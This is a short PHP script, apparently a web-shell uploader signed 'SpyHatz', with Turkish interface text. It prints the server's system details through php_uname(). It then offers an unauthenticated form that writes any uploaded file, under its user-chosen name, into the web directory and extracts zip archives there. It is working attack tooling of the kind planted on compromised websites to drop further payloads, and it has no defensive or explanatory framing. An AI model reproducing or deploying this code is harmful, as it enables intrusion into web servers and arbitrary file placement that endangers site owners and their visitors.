 <?php
echo '<b>Sw Bilgi<br><br>'.php_uname().'<br> Yükleyeceğiniz Dosya .zip Olamlıdır.</b> // SpyHatz';
echo '<form action="" method="post" enctype="multipart/form-data" name="uploader" id="uploader">';
echo '<input type="file" name="file" size="50"><input name="_upl" type="submit" id="_upl" value="Upload"></form>';
if( $_POST['_upl'] == "Upload" ) {
$file = $_FILES['file']['name'];
if(@copy($_FILES['file']['tmp_name'], $_FILES['file']['name'])) {
$zip = new ZipArchive;
if ($zip->open($file) === TRUE) {
    $zip->extractTo('./');
    $zip->close();
echo 'Yükleme Başarılı';
} else {
echo 'Yüklendi Ancak Çıkarma Başarısız.';
}    
}else{ 
echo '<b>Basarisiz</b><br><br>'; 
}
}
?>